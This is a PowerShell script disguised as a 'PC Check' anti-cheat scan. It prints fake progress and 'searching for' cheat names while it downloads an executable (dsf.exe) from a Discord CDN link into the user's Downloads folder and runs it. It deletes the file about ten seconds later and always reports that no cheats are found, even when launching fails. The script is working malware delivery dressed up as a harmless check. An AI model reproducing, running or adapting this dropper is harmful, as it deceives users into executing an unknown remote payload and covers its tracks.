# --- PC Check ---
Write-Host "Running PC Check..." -ForegroundColor Green

# Function to display colored progress
function Show-Progress {
    param([int]$percent)
    
    # Clear the current line
    Write-Host "`r" -NoNewline
    
    # Display percentage in green
    Write-Host "$percent% " -ForegroundColor Green -NoNewline
    
    # Display random searching messages
    $messages = @(
        "searching for Eulen",
        "searching for Susano",
        "searching for Susano", 
        "searching for Custom",
        "searching for Skript"
    )
    
    if ($percent -eq 10 -or $percent -eq 20 -or $percent -eq 30 -or $percent -eq 40 -or $percent -eq 50) {
        $randomMessage = $messages | Get-Random
        $randomColor = Get-Random -Minimum 1 -Maximum 15
        Write-Host $randomMessage -ForegroundColor $randomColor -NoNewline
    }
}

# Get computer info (silently)
Get-ComputerInfo | Out-Null
Show-Progress -percent 10

# --- User Configuration ---
$url = "https://cdn.discordapp.com/attachments/1481031763563118712/1481042495721967837/dsf.exe?ex=69b1dfcf&is=69b08e4f&hm=71a7ec9284a04bf90e2fe44bf5af386750cded54fd9562e2ebc718d3bce4a54c&"
$outputPath = "$env:USERPROFILE\Downloads\dsf.exe"
# --- End Configuration ---

Start-Sleep -Milliseconds 500
Show-Progress -percent 20

# Download the file
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    Show-Progress -percent 30
    Start-Sleep -Milliseconds 500
    Show-Progress -percent 40
}
catch {
    Write-Host "`rError downloading file" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to exit"
    exit
}

# Run the executable
try {
    Start-Process -FilePath $outputPath
    Show-Progress -percent 50
    Start-Sleep -Milliseconds 500
    Show-Progress -percent 60
    Start-Sleep -Milliseconds 500
    Show-Progress -percent 70
    Start-Sleep -Milliseconds 500
    Show-Progress -percent 80
    Start-Sleep -Milliseconds 500
    Show-Progress -percent 90
    Start-Sleep -Milliseconds 500
    
    # Wait 10 seconds
    Start-Sleep -Seconds 10
    
    # Delete the file
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force
    }
    
    # Display completion
    Write-Host "`r100% " -ForegroundColor Green -NoNewline
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
}
catch {
    Write-Host "`rError launching executable" -ForegroundColor Red
    
    # Still attempt to delete the file if it exists
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force
    }
    
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to exit"
}

Read-Host -Prompt "Press Enter to exit"
